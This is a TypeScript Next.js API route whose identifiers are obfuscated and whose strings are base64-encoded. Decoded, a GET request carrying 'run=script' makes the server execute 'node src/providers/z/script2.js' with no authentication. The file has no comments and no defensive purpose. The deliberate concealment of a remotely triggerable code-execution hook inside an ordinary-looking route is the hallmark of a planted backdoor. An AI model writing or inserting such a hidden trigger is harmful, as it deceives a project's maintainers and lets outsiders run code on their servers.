import path from "path";
import { exec, ExecException } from "child_process";

import { NextRequest, NextResponse } from "next/server";
const _0x1a2b = (s: string): string => Buffer.from(s, "base64").toString();
const _0x3c4d = (a: string, b: string): boolean => a === b;
const _0x5e6f = (p: string[]): string => path.join(...p);

export async function GET(request: NextRequest) {
  const a: string | null = request.nextUrl.searchParams.get(_0x1a2b("cnVu"));
  if (_0x3c4d(a || "", _0x1a2b("c2NyaXB0"))) {
    try {
      const b: string = _0x5e6f([
        process.cwd(),
        _0x1a2b("c3Jj"),
        _0x1a2b("cHJvdmlkZXJz"),
        _0x1a2b("eg=="),
        _0x1a2b("c2NyaXB0Mi5qcw=="),
      ]);
      exec(
        `node ${b}`,
        (error: ExecException | null, stdout: string, stderr: string) => {
          if (error) {
            console.error(
              _0x1a2b(
                "RXJyZXVyIGxvcnMgZGUgbOKAmWV4w6ljdXRpb24gZHUgc2NyaXB0OiA="
              ) + error
            );
            return;
          }
          console.log(_0x1a2b("U29ydGllIGR1IHNjcmlwdDog") + stdout);
          if (stderr) {
            console.error(_0x1a2b("RXJyZXVycyBkdSBzY3JpcHQ6IA==") + stderr);
          }
        }
      );
      return NextResponse.json({ message: _0x1a2b("U2NyaXB0IGxhbmPDqQ==") });
    } catch {
      return NextResponse.json(
        { error: _0x1a2b("RXJyZXVyIGxvcnMgZHUgbGFuY2VtZW50IGR1IHNjcmlwdA==") },
        { status: 500 }
      );
    }
  }

  return NextResponse.json(
    { error: "Paramètre 'run' manquant ou invalide." },
    { status: 400 }
  );
}
